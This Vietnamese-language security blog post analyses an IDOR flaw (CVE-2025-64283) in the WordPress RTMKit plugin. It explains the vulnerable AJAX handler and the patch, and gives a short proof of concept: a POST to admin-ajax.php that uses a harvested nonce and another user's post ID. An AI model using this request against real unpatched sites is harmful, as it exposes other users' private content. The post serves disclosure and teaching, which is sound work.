# CVE-2025-64283 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **vượt qua cơ chế xác thực (Authorization Bypass)** thông qua **khóa do người dùng kiểm soát (User-Controlled Key)** trong **Rometheme RTMKit (rometheme-for-elementor)** cho phép **khai thác cơ chế kiểm soát truy cập được cấu hình không đúng (Incorrectly Configured Access Control)**.
Lỗ hổng này ảnh hưởng đến **RTMKit** từ **n/a** đến **phiên bản ≤ 1.6.7**.

* **CVE ID**: [CVE-2025-64283](https://www.cve.org/CVERecord?id=CVE-2025-64283)
* **Vulnerability Type**: Insecure Direct Object References (IDOR)
* **Affected Versions**: <= 1.6.7
* **Patched Versions**: 1.6.8
* **CVSS severity**: Low (5.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress ARTMKit Plugin](hhttps://wordpress.org/plugins/rometheme-for-elementor/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **ARTMKit**:  
    * `1.6.7` – **vulnerable**  
    * `1.6.8` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
Plugin đã đăng ký action hook:

```php {title="template.php v1.6.7" data-open=true hl_lines=[]}
add_action('wp_ajax_get_template_content', [$this, 'get_template_content']);
```

Trong WordPress, tiền tố `wp_ajax_` dùng để xử lý các yêu cầu AJAX gửi đến `/wp-admin/admin-ajax.php` từ **người dùng đã đăng nhập**. Khi request có tham số `action=get_template_content`, WordPress sẽ gọi hàm `get_template_content` tương ứng để xử lý và trả về dữ liệu.

```php {title="template.php v1.6.7" data-open=true hl_lines=[]}
public function get_template_content()
{
    if (!isset($_POST['wpnonce']) ||  ! check_ajax_referer('rtm_template_nonce', 'wpnonce')) {
        wp_send_json_error('Access Denied');
        wp_die();
    }

    $id = absint($_POST['template']);

    $elementorData = get_post_meta($id, '_elementor_data', true);

    $data = ['content' => json_decode($elementorData)];

    wp_send_json_success($data);
}
```

Hàm `get_template_content` xử lý request AJAX và thực hiện các bước sau:

1. Kiểm tra sự tồn tại của `wpnonce` và xác thực nonce bằng `check_ajax_referer` để đảm bảo request hợp lệ, chống CSRF.
> [!TIP]
> Khi search với từ khóa `rtm_template_nonce`
> ![Create nonce](create_nonce.png "Cách nonce được tạo")
> Nonce được tạo bằng `wp_create_nonce('rtm_template_nonce')` và được **gắn vào biến JavaScript** `rkit_libs` thông qua `wp_localize_script` với **key lưu trữ là `template_nonce`**. Phía client sẽ sử dụng giá trị này và gửi lên server trong request AJAX dưới dạng tham số `wpnonce` để phục vụ cho bước xác thực.
> Khi filter request bằng BurpSuite với từ khóa `rkit_libs` sẽ thấy được giá trị này
> ![Nonce value](nonce.png "Nonce value")

2. Lấy tham số `template` từ `POST` và ép kiểu số nguyên bằng `absint`.
3. Truy xuất dữ liệu `_elementor_data` tương ứng với post ID thông qua `get_post_meta`.
4. Giải mã dữ liệu JSON và đóng gói vào mảng kết quả.
5. Trả về dữ liệu bằng phản hồi JSON thành công (`wp_send_json_success`).

> [!BUG]
> Lỗ hổng xuất hiện khi `$id` không được kiểm soát chặt, khiến người dùng **Contributor+** có thể lấy bất cứ dữ liệu post nào của người dùng khác.

**Bản vá v1.6.8** bổ sung bước kiểm tra quyền người dùng bằng `current_user_can('manage_options')`:

```php
if (!current_user_can('manage_options')) {
    wp_send_json_error('Access Denied: Insufficient permissions');
    wp_die();
}
```

Đảm bảo chỉ những user có quyền **Administrator** mới được phép tiếp tục xử lý. Nếu người dùng không đủ quyền, request sẽ bị từ chối ngay và trả về thông báo lỗi `Access Denied: Insufficient permissions`.

## Flow
{{< mermaid >}}
flowchart TD
A["Authenticated Contributor"]
--> B["Send POST request to admin-ajax.php"]
B --> C["action=get_template_content"]
C --> D["get_template_content() executed"]
D --> E["check_ajax_referer passed"]
E --> F["Control template ID parameter"]
F --> G["get_post_meta(target_id, _elementor_data)"]
G --> H["Return template content"]

{{< /mermaid >}}

## Proof of Concept (PoC)
1. Tạo post bằng **Elementor** với **Contributor+ user**
2. Bắt request bằng BurpSuite và lấy giá trị nonce được trả về:

```html
<script id="rkit-library-script-js-extra">
    var rkit_libs = {"logo_url":"http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png","ajax_url":"http://localhost/wp-admin/admin-ajax.php","template_nonce":"nonce_value"};
    //# sourceURL=rkit-library-script-js-extra
</script>
```

3. Gửi request với `template=id_of_other_post`

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: contributor_cookie

action=get_template_content&wpnonce=bea52715a7&template=25
```

**Result:**

![Administrator post](admin_post.png "Administrator post content")

**Một số Ajax khác cũng tồn tại lỗ hổng này**:
* `wp_ajax_fetch_lib`
* `wp_ajax_fetch_envato_template`
* `wp_ajax_get_installed_template`
* `wp_ajax_get_installed_templates`
* `wp_ajax_template_category`

## Conclusion

CVE-2025-64283 xuất phát từ việc plugin chỉ dựa vào **nonce** để xác thực request AJAX mà không thực hiện **kiểm tra quyền truy cập theo vai trò người dùng**. Điều này cho phép người dùng có quyền thấp hơn (Contributor+) kiểm soát tham số `template` và truy xuất dữ liệu `_elementor_data` của các post không thuộc quyền sở hữu của họ. Bản vá v1.6.8 đã khắc phục vấn đề bằng cách bổ sung kiểm tra quyền quản trị, ngăn chặn việc truy cập trái phép.

## Key Takeaways

* Nonce **không thay thế** cho kiểm soát quyền truy cập (authorization).
* AJAX action trong WordPress cần **kiểm tra capability phù hợp**, không chỉ kiểm tra đăng nhập.
* Các tham số định danh đối tượng (ID) do người dùng kiểm soát cần được **ràng buộc quyền truy cập rõ ràng**.
* IDOR thường xuất hiện trong các logic AJAX bị cấu hình kiểm soát truy cập không đầy đủ.

## References
[IDOR](https://book.hacktricks.wiki/en/pentesting-web/idor.html)

[WordPress ARTMKit Plugin <= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)](https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability)  

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/  

